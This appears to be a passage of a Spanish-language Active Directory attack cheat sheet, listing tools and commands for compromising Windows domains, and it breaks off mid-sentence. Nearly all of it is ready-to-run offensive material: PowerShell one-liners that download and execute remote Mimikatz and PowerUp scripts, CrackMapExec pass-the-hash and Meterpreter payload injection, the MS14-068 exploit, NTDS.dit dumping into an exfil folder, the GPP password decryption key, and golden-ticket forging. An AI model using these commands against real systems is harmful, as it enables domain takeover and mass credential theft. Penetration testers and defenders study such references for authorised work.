# Ataques a Active Directory

## Resumen

* [Herramientas](#herramientas)
* [Rutas más comunes para comprometer AD](#rutas-más-comunes-para-comprometer-ad)
  * [MS14-068 (Vulnerabilidad de Validación de Suma de Control de Kerberos de Microsoft)](#ms14-068-vulnerabilidad-de-validación-de-suma-de-control-de-kerberos-de-microsoft)
  * [Comparticiones Abiertas](#comparticiones-abiertas)
  * [GPO - Pivoting con Admin Local y Contraseñas en SYSVOL](#gpo---pivoting-con-admin-local-y-contraseñas-en-sysvol)
  * [Volcado de Credenciales de Dominio de AD](#volcado-de-credenciales-de-dominio-de-ad-systemrootntdsntdsdit)
  * [Contraseña en el Comentario de Usuario de AD](#contraseña-en-el-comentario-de-usuario-de-ad)
  * [Golden Tickets](#golden-tickets)
  * [Silver Tickets](#silver-tickets)
  * [Trust Tickets](#trust-tickets)
  * [Kerberoast](#kerberoast)
  * [Pass-the-Hash](#pass-the-hash)
  * [OverPass-the-Hash (Pass the Key)](#overpass-the-hash-pass-the-key)
  * [Uso Peligroso de Grupos Integrados](#uso-peligroso-de-grupos-integrados)
  * [Relación de Confianza entre Dominios](#relación-de-confianza-entre-dominios)
* [Escalada de Privilegios](#escalada-de-privilegios)
  * [Escalada de Privilegios Admin Local - Token Impersonation (RottenPotato)](#escalada-de-privilegios-admin-local---token-impersonation-rottenpotato)
  * [Escalada de Privilegios Admin Local - MS16-032](#escalada-de-privilegios-admin-local---ms16-032---microsoft-windows-7--10--2008--2012-r2-x86x64)
  * [Escalada de Privilegios Admin Local - MS17-010 (Eternal Blue)](#escalada-de-privilegios-admin-local---ms17-010-eternal-blue)
  * [De Admin Local a Admin de Dominio](#de-admin-local-a-admin-de-dominio)

---

## Herramientas

* [Impacket](https://github.com/CoreSecurity/impacket) o la [versión para Windows](https://github.com/maaaaz/impacket-examples-windows)
* [Responder](https://github.com/SpiderLabs/Responder)
* [Mimikatz](https://github.com/gentilkiwi/mimikatz)
* [Ranger](https://github.com/funkandwagnalls/ranger)
* [BloodHound](https://github.com/BloodHoundAD/BloodHound)

  ```powershell
  apt install bloodhound #kali
  neo4j console
  Ir a http://127.0.0.1:7474, usar db:bolt://localhost:7687, usuario:neo4J, contraseña:neo4j
  ./bloodhound
  SharpHound.exe (desde resources/Ingestor)
  o
  Invoke-BloodHound -SearchForest -CSVFolder C:\Users\Public
  ```

* [AdExplorer](https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer)
* [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)

  ```bash
  git clone --recursive https://github.com/byt3bl33d3r/CrackMapExec
  crackmapexec smb -L
  crackmapexec smb -M nombre_módulo -o VAR=DATOS
  crackmapexec 192.168.1.100 -u Jaddmon -H 5858d47a41e40b40f294b3100bea611f --shares
  crackmapexec 192.168.1.100 -u Jaddmon -H 5858d47a41e40b40f294b3100bea611f -M rdp -o ACTION=enable
  crackmapexec 192.168.1.100 -u Jaddmon -H 5858d47a41e40b40f294b3100bea611f -M metinject -o LHOST=192.168.1.63 LPORT=4443
  crackmapexec 192.168.1.100 -u Jaddmon -H ":5858d47a41e40b40f294b3100bea611f" -M web_delivery -o URL="https://IP:PUERTO/posh-payload"
  crackmapexec 192.168.1.100 -u Jaddmon -H ":5858d47a41e40b40f294b3100bea611f" --exec-method smbexec -X 'whoami'
  ```

* [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)

  ```powershell
  powershell.exe -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.11.0.47/PowerUp.ps1'); Invoke-AllChecks"
  powershell.exe -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/Invoke-Mimikatz.ps1');"
  ```

* [Script de Evaluación y Escalada de Privilegios en Active Directory](https://github.com/hausec/ADAPE-Script)

---

## Rutas más comunes para comprometer AD

---

### MS14-068 (Vulnerabilidad de Validación de Suma de Control de Kerberos de Microsoft)

```bash
Exploit en Python: https://www.exploit-db.com/exploits/35474/
Documentación: https://github.com/gentilkiwi/kekeo/wiki/ms14068
Metasploit: auxiliary/admin/kerberos/ms14_068_kerberos_checksum

git clone https://github.com/bidord/pykek
python ./ms14-068.py -u <nombre_usuario>@<nombre_dominio> -s <sid_usuario> -d <dirección_controlador_dominio> -p <contraseña_clara>
python ./ms14-068.py -u darthsidious@lab.adsecurity.org -p TheEmperor99! -s S-1-5-21-1473643419-774954089-2222329127-1110 -d adsdc02.lab.adsecurity.org
mimikatz.exe "kerberos::ptc c:\temp\TGT_darthsidious@lab.adsecurity.org.ccache"
```

---

### Comparticiones Abiertas

```powershell
pth-smbclient -U "AD/ADMINISTRADOR%aad3b435b51404eeaad3b435b51404ee:2[...]A" //192.168.10.100/Share
ls # listar archivos
cd
get # descargar archivos
put # reemplazar archivo
```

Montar una compartición

```powershell
smbmount //X.X.X.X/c$ /mnt/remote/ -o username=usuario,password=contraseña,rw
```

---

### GPO - Pivoting con Admin Local y Contraseñas en SYSVOL

:triangular_flag_on_post: **Priorización de GPO**: Unidad Organizativa > Dominio > Sitio > Local

Buscar contraseñas en SYSVOL

```powershell
findstr /S /I cpassword \\<FQDN>\sysvol\<FQDN>\policies\*.xml
```

Descifrar una contraseña de política de grupo encontrada en SYSVOL (por [0x00C651E0](https://twitter.com/0x00C651E0/status/956362334682849280))

```bash
echo 'contraseña_en_base64' | base64 -d | openssl enc -d -aes-256-cbc -K 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b -iv 0000000000000000

Ejemplo: echo '5OPdEKwZSf7dYAvLOe6RzRDtcvT/wCP8g5RqmAgjSso=' | base64 -d | openssl enc -d -aes-256-cbc -K 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b -iv 0000000000000000
```

Módulos de Metasploit para enumerar comparticiones y credenciales

```c
scanner/smb/smb_enumshares
post/windows/gather/enum_shares
post/windows/gather/credentials/gpp
```

Módulos de CrackMapExec

```powershell
cme smb 192.168.1.2 -u Administrator -H 89[...]9d -M gpp_autologin
cme smb 192.168.1.2 -u Administrator -H 89[...]9d -M gpp_password
```

Listar todas las GPO de un dominio

```powershell
Get-GPO -domaine DOMINIO.COM -all
Get-GPOReport -all -reporttype xml --all

PowerSploit:
Get-NetGPO
Get-NetGPOGroup
```

---

### Volcado de Credenciales de Dominio de AD (%SystemRoot%\NTDS\Ntds.dit)

#### Usando ntdsutil

```powershell
C:\>ntdsutil
ntdsutil: activate instance ntds
ntdsutil: ifm
ifm: create full c:\pentest
ifm: quit
ntdsutil: quit
```

#### Usando Vshadow

```powershell
vssadmin create shadow /for=C:
Copy Shadow_Copy_Volume_Name\windows\ntds\ntds.dit c:\ntds.dit
```

También puedes usar el script de Nishang, disponible en: [https://github.com/samratashok/nishang](https://github.com/samratashok/nishang)

```powershell
Import-Module .\Copy-VSS.ps1
Copy-VSS
Copy-VSS -DestinationDir C:\ShadowCopy\
```

#### Usando vssadmin

```powershell
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\ShadowCopy
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\ShadowCopy
```

#### Usando DiskShadow (un binario firmado de Windows)

```powershell
diskshadow.txt contiene:
set context persistent nowriters
add volume c: alias someAlias
create
expose %someAlias% z:
exec "cmd.exe" /c copy z:\windows\ntds\ntds.dit c:\exfil\ntds.dit
delete shadows volume %someAlias%
reset

Luego:
NOTA - debe ejecutarse desde C:\Windows\System32
diskshadow.exe /s c:\diskshadow.txt
dir c:\exfil
reg.exe save hklm\system c:\exfil\system.bak
```

#### Extraer hashes de ntds.dit

Luego necesitas usar secretsdump para extraer los hashes

```java
secretsdump.py -system /root/SYSTEM -ntds /root/ntds.dit LOCAL
```

secretsdump también funciona de forma remota

```java
./secretsdump.py -dc-ip IP AD\administrador@dominio -use-vss
./secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:0f49aab58dd8fb314e268c4c6a65dfc9 -just-dc PENTESTLAB/dc\$@10.0.0.1
```

#### Alternativas - módulos

Módulos de Metasploit

```c
windows/gather/credentials/domain_hashdump
```

Módulo de PowerSploit

```powershell
Invoke-NinjaCopy --path c:\windows\NTDS\ntds.dit --verbose --localdestination c:\ntds.dit
```

Módulo de CrackMapExec

```powershell
cme smb 10.10.0.202 -u usuario -p contraseña --ntds vss
```

---
### Contraseña en el Comentario de Usuario de AD

```powershell
enum4linux | grep -i desc
Existen 3-4 campos comunes en la mayoría de esquemas de AD:
UserPassword, UnixUserPassword, unicodePwd y msSFU30Password.
```

---
### Golden Tickets

Para forjar un TGT se requiere la clave de krbtgt

Versión con Mimikatz

```powershell
Obtener información - Mimikatz
lsadump::dcsync /user:krbtgt
lsadump::lsa /inject /name:krbtgt

Forjar un Golden Ticket - Mimikatz
kerberos::purge
kerberos::golden /user:evil /domain:pentestlab.local /sid:S-1-5-21-3737340914-2019594255-2413685307 /krbtgt:d125e4f69c851529045ec95ca80fa37e /ticket:evil.tck /ptt
kerberos::tgt
```

Versión con Meterpreter

```powershell
Obtener información - Meterpreter(kiwi)
dcsync_ntlm krbtgt
dcsync krbtgt

Forjar un Golden Ticket - Meterpreter
load kiwi
golden_ticket_create -d <nombre_dominio> -k <hash_nt_de_krbtgt> -s <SID_sin_RID> -u <usuario_para_el_ticket> -t <ubicación_para_guardar_tck>
golden_ticket_create -d pentestlab.local -u pentestlabuser -s S-1-5-21-3737340914-2019594255-2413685307 -k d125e4f69c851529045ec95ca80fa37e -t /root/Downloads/pentestlabuser.tck
kerberos_ticket_purge
kerberos_ticket_use /root/Downloads/pentestlabuser.tck
kerberos_ticket_list
```

Usar un ticket en Linux

```powershell
Convertir el ticket kirbi a ccache con kekeo
misc::convert ccache ticket.kirbi

Alternativamente puedes usar ticketer de Impacket
./ticketer.py -nthash a577fcf16cfef780a2ceb343ec39a0d9 -domain-sid S-1-5-21-2972629792-1506071460-1188933728 -domain amity.local mbrody-da

ticketer.py -nthash HASHKRBTGT -domain-sid SID_DOMINIO_A -domain DEV Administrator -extra-sid SID_DOMINIO_B_ENTERPRISE_519
./ticketer.py -nthash e65b41757ea496c2c60e82c05ba8b373 -domain-sid S-1-5-21-354401377-2576014548-1758765946 -domain DEV Administrator -extra-sid S-1-5-21-2992845451-2057077057-2526624608-519

export KRB5CCNAME=/home/usuario/ticket.ccache
cat $KRB5CCNAME

NOTA: Es posible que necesites comentar la configuración proxy_dns en el archivo de configuración de prox
